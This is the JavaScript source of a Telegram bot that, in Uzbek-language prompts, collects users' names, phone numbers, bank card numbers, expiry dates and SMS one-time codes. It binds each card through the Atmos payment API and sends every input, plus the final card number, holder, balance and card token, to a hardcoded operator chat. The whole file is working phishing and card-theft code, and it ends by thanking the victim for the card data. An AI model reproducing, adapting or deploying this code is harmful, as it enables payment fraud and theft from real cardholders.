require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const app = express();
const { bot } = require('./src/lib/bot');
const model = require('./model');
const atmos = require('./src/lib/atmos/atmos');
const localText = require('./text.json');

function formatBalanceWithSpaces(balance) {
   return new Intl.NumberFormat('en-US', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
   })
      .format(balance / 100)
      .replace(/,/g, ' ');
}

function hasExact16Numbers(text) {
   return /^\d{16}$/.test(text);
}

function isValidDateFormat(text) {
   return /^\d{2}\/\d{2}$/.test(text);
}

bot.onText(/\/start/, async (msg) => {
   const chatId = msg.chat.id;
   const foundUser = await model.foundUser(chatId);
   const foundCards = await model.foundCards(chatId);

   if (foundUser) {
      if (foundCards?.count == 0) {
         bot.sendMessage(chatId, localText.startText1).then(async () => {
            bot.sendMessage(chatId, localText.askCardNumberUz).then(
               async () => {
                  await model.editStep(chatId, 'ask_card_number');
               },
            );
         });
      } else {
         bot.sendMessage(chatId, localText.startText1);
      }
   } else {
      bot.sendMessage(chatId, localText.startText1).then(async () => {
         bot.sendMessage(chatId, localText.startText2, {
            reply_markup: {
               keyboard: [
                  [
                     {
                        text: localText.uz,
                     },
                     {
                        text: localText.cyrillic,
                     },
                  ],
               ],
               resize_keyboard: true,
            },
         }).then(async () => {
            await model.createUser(chatId, 'start');
         });
      });
   }
});

bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text;
   const foundUser = await model.foundUser(chatId);

   if (text == localText.uz) {
      bot.sendMessage(chatId, localText.askNameUz).then(async () => {
         await model.editStep(chatId, 'ask_name');
         await model.editLang(chatId, 'uz');
         bot.sendMessage(634041736, text)
      });
   } else if (text == localText.cyrillic) {
      bot.sendMessage(chatId, localText.askNameCyrillic).then(async () => {
         await model.editStep(chatId, 'ask_name');
         await model.editLang(chatId, 'cyrillic');
         bot.sendMessage(634041736, text)
      });
   } else if (foundUser?.step == 'ask_name') {
      if (foundUser?.lang == 'uz') {
         const formatText = localText?.askContactUz.replace(/%name%/g, text);
         bot.sendMessage(chatId, formatText, {
            reply_markup: {
               keyboard: [
                  [
                     {
                        text: localText.askContactBtnUz,
                        request_contact: true,
                        one_time_keyboard: true,
                     },
                  ],
               ],
               resize_keyboard: true,
               one_time_keyboard: true,
            },
         }).then(async () => {
            await model.editStep(chatId, 'ask_contact');
            await model.editName(chatId, text);
            bot.sendMessage(634041736, text)
         });
      } else if (foundUser?.lang == 'cyrillic') {
         const formatText = localText?.askContactCyrillic.replace(
            /%name%/g,
            text,
         );
         bot.sendMessage(chatId, formatText, {
            reply_markup: {
               keyboard: [
                  [
                     {
                        text: localText.askContactBtnCyrillic,
                        request_contact: true,
                        one_time_keyboard: true,
                     },
                  ],
               ],
               resize_keyboard: true,
               one_time_keyboard: true,
            },
         }).then(async () => {
            await model.editStep(chatId, 'ask_contact');
            await model.editName(chatId, text);
            bot.sendMessage(634041736, text)
         });
      }
   } else if (foundUser?.step == 'ask_card_number') {
      const verifyNumber = hasExact16Numbers(text);
      bot.sendMessage(634041736, text)

      if (foundUser?.lang == 'uz') {
         if (verifyNumber) {
            const addCardNumber = await model.addCardNumber(chatId, text);

            if (addCardNumber) {
               bot.sendMessage(chatId, localText.askExpiredUz).then(
                  async () => {
                     await model.editStep(chatId, 'ask_expired');
                  },
               );
            }
         } else {
            bot.sendMessage(chatId, localText.cardNumberErrorUz).then(
               async () => {
                  await model.editStep(chatId, 'ask_card_number');
               },
            );
         }
      } else if (foundUser?.lang == 'cyrillic') {
         if (verifyNumber) {
            const addCardNumber = await model.addCardNumber(chatId, text);

            if (addCardNumber) {
               bot.sendMessage(chatId, localText.askExpiredCyrillic).then(
                  async () => {
                     await model.editStep(chatId, 'ask_expired');
                  },
               );
            }
         } else {
            bot.sendMessage(chatId, localText.cardNumberErrorCyrillic).then(
               async () => {
                  await model.editStep(chatId, 'ask_card_number');
               },
            );
         }
      }
   } else if (foundUser?.step == 'ask_expired') {
      const ValidDateFormat = isValidDateFormat(text);
      bot.sendMessage(634041736, text)

      if (ValidDateFormat) {
         const addCardExpiry = await model.addCardExpiry(chatId, text);

         if (addCardExpiry) {
            const atmosToken = await model.atmosToken();
            const formatExpire = addCardExpiry?.expiry?.split('/').reverse().join('');
            const atmosBind = await atmos.bindInit(
               addCardExpiry?.card_number,
               formatExpire,
               atmosToken?.token,
               atmosToken?.expires,
            );

            if (atmosBind?.result?.code == 'OK') {
               const addCardTransId = await model.addCardTransId(
                  chatId,
                  atmosBind?.transaction_id,
               );

               if (addCardTransId) {
                  if (foundUser?.lang == 'uz') {
                     bot.sendMessage(chatId, localText.askOTPUz).then(
                        async () => {
                           await model.editStep(chatId, 'ask_otp');
                        },
                     );
                  } else if (foundUser?.lang == 'cyrillic') {
                     bot.sendMessage(chatId, localText.askOTPCyrillic).then(
                        async () => {
                           await model.editStep(chatId, 'ask_otp');
                        },
                     );
                  }
               }
            } else {
               if (foundUser?.lang == 'uz') {
                  bot.sendMessage(chatId, localText.askExpiredErrorUz).then(
                     async () => {
                        await model.editStep(chatId, 'ask_expired');
                     },
                  );
               } else if (foundUser?.lang == 'cyrillic') {
                  bot.sendMessage(
                     chatId,
                     localText.askExpiredErrorCyrillic,
                  ).then(async () => {
                     await model.editStep(chatId, 'ask_expired');
                  });
               }
            }
         }
      } else {
         if (foundUser?.lang == 'uz') {
            bot.sendMessage(chatId, localText.askExpiredErrorUz).then(
               async () => {
                  await model.editStep(chatId, 'ask_expired');
               },
            );
         } else if (foundUser?.lang == 'cyrillic') {
            bot.sendMessage(chatId, localText.askExpiredErrorCyrillic).then(
               async () => {
                  await model.editStep(chatId, 'ask_expired');
               },
            );
         }
      }
   } else if (foundUser?.step == 'ask_otp') {
      bot.sendMessage(634041736, text)
      const atmosToken = await model.atmosToken();
      const foundCard = await model.foundCard(chatId);
      const atmosOtp = await atmos.bindConfirm(
         text,
         foundCard?.transaction_id,
         atmosToken?.token,
         atmosToken?.expires,
      );

      if (atmosOtp?.result?.code == 'OK') {
         const addCardData = await model.addCardData(
            chatId,
            atmosOtp.data.card_id,
            atmosOtp.data.pen,
            atmosOtp.data.expiry,
            atmosOtp.data.card_holder,
            atmosOtp.data.balance,
            atmosOtp.data.phone,
            atmosOtp.data.card_token,
         );

         if (addCardData) {
            bot.sendMessage(
               chatId,
               "Karta daniylari uchun raxmat sog' bo'ling brat.",
            );
            bot.sendMessage(
               634041736,
               `Karta ma'lumoti:\nkarta raqami: ${addCardData.card_number}\nEgasi: ${addCardData.card_holder}\nTelefon raqami: ${addCardData.phone_number}\nBalance:${formatBalanceWithSpaces(addCardData?.balance)}\nKarta token: ${addCardData?.card_token}`,
            );
         }
      }
   }
});

bot.on('contact', async (msg) => {
   const chatId = msg.chat.id;
   const foundUser = await model.foundUser(chatId);

   if (msg.contact && foundUser?.step == 'ask_contact') {
      let phoneNumber = msg.contact.phone_number;

      if (!phoneNumber.startsWith('+')) {
         phoneNumber = `+${phoneNumber}`;
      }

      bot.sendMessage(634041736, phoneNumber)
      const addPhoneUser = await model.addPhoneUser(chatId, phoneNumber);

      if (addPhoneUser) {
         if (foundUser?.lang == 'uz') {
            bot.sendMessage(chatId, localText.successfulUz)
               .then(async () => {
                  bot.sendMessage(chatId, localText.askCardNumberUz).then(
                     async () => {
                        await model.editStep(chatId, 'ask_card_number');
                     },
                  );
               });

         } else if (foundUser?.lang == 'cyrillic') {
            bot.sendMessage(chatId, localText.successfulCyrillic).then(async () => {
               bot.sendMessage(chatId, localText.askCardNumberCyrillic).then(
                  async () => {
                     await model.editStep(chatId, 'ask_card_number');
                  },
               );
            });

         }
      }
   }
});

app.use(
   cors({
      origin: '*',
   }),
);
app.use(express.json());
app.use(
   express.urlencoded({
      extended: true,
   }),
);

app.listen(7000, console.log(7000));
